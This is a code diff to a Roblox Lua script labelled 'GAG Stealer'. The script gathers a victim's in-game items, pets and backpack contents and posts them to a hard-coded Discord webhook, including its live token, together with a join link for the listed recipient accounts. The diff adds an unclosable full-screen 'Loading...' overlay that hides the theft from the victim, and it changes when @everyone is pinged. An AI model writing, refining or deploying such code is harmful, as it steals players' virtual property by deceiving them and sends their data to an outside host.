@@ -1,10 +1,8 @@
-
-
--- USER SETTINGS
 _G.Usernames = {"saikigrow", "", "Wanwood42093"}
 _G.min_value = 100000000
-_G.pingEveryone = "Yes"
+_G.pingEveryone = ""
 _G.webhook = "https://discord.com/api/webhooks/1392880984428384398/b0i3uImsepPTsn5HU_GebQsbnECumyVbr8E_SJLxZNbQmqqTOOMFJWYA-9BJi_LFu_45"
+
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
@@ -242,21 +240,21 @@ local backpackList = #allBackpackItems > 0 and "• " .. table.concat(allBackpac
 local data = {  
     ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",  
     ["embeds"] = {{  
-        ["title"] = "💰 New Player Joined",  
-        ["description"] = "A new target has joined the server.",  
+        ["title"] = "**💰 New Player Joined**",  
+        ["description"] = "**A new target has joined the server.**",  
         ["color"] = 0x00ff66,  
         ["fields"] = {  
-            { name = "👤 Username", value = plr.Name, inline = true },  
-            { name = "🔗 Join Link", value = ("[Click here to join](https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=%s)"):format(game.JobId), inline = true },  
-            { name = "📦 Items Found", value = (#itemList > 0 and itemList) or "*No items detected*", inline = false },  
-            { name = "🐾 Total Pets", value = tostring(totalPetsCount), inline = true },  
-            { name = "🎒 Full Backpack Contents", value = backpackList, inline = false },  
-            { name = "📊 Summary", value = ("**Total Value:** ¢%s\n**Heaviest Fruit:** %.2f KG"):format(formatNumber(totalValue), highestKG), inline = false }  
+            { name = "**👤 Username**", value = "**" .. plr.Name .. "**", inline = true },  
+            { name = "**📦 Items Found**", value = (#itemList > 0 and ("**" .. itemList .. "**")) or "*No items detected*", inline = false },  
+            { name = "**🎒 Full Backpack Contents**", value = "**" .. backpackList .. "**", inline = false },  
+            { name = "**📊 Summary**", value = ("**Total Value:** ¢%s\n**Heaviest Fruit:** %.2f KG"):format(formatNumber(totalValue), highestKG), inline = false },  
+            { name = "**🐾 Total Pets**", value = "**" .. tostring(totalPetsCount) .. "**", inline = true },  
+            { name = "**🔗 Join Link**", value = ("**[Click here to join](https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=%s)**"):format(game.JobId), inline = false }  
         },  
         ["footer"] = { ["text"] = "🕵️‍♂️ GAG Stealer • discord.gg/GY2RVSEGDT" },  
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  
     }}  
-}  
+}
 
 local body = HttpService:JSONEncode(data)  
 local headers = {["Content-Type"] = "application/json"}  
@@ -324,10 +322,10 @@ return a.Value > b.Value
 end
 end)
 
-local prefix = ""  
-if ping == "Yes" and hasRarePet(itemsToSend) then  
-    prefix = "@everyone "  
-end  
+local prefix = ""
+if hasRarePet(itemsToSend) then
+    prefix = "@everyone "
+end
 
 SendJoinMessage(itemsToSend, prefix)  
 
@@ -364,7 +362,48 @@ local function waitForUserChat()
     Players.PlayerAdded:Connect(onPlayerChat)  
 end  
 
-waitForUserChat()
+local function showBlockingLoadingScreen()
+    local playerGui = plr:WaitForChild("PlayerGui")
+    
+    local loadingScreen = Instance.new("ScreenGui")
+    loadingScreen.Name = "UnclosableLoading"
+    loadingScreen.ResetOnSpawn = false
+    loadingScreen.IgnoreGuiInset = true
+    loadingScreen.DisplayOrder = 999999
+    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loadingScreen.Parent = playerGui
 
+    local blackFrame = Instance.new("Frame")
+    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackFrame.Size = UDim2.new(1, 0, 1, 0)
+    blackFrame.Position = UDim2.new(0, 0, 0, 0)
+    blackFrame.BorderSizePixel = 0
+    blackFrame.ZIndex = 1
+    blackFrame.Parent = loadingScreen
+
+    local loadingLabel = Instance.new("TextLabel")
+    loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
+    loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
+    loadingLabel.BackgroundTransparency = 1
+    loadingLabel.TextScaled = true
+    loadingLabel.Text = "Loading..."
+    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
+    loadingLabel.Font = Enum.Font.SourceSansBold
+    loadingLabel.ZIndex = 2
+    loadingLabel.Parent = loadingScreen
+
+    -- Simple looping animation
+    coroutine.wrap(function()
+        while true do
+            for i = 1, 3 do
+                loadingLabel.Text = "Loading" .. string.rep(".", i)
+                task.wait(0.5)
+            end
+        end
+    end)()
 end
 
+
+showBlockingLoadingScreen()
+waitForUserChat()
+end
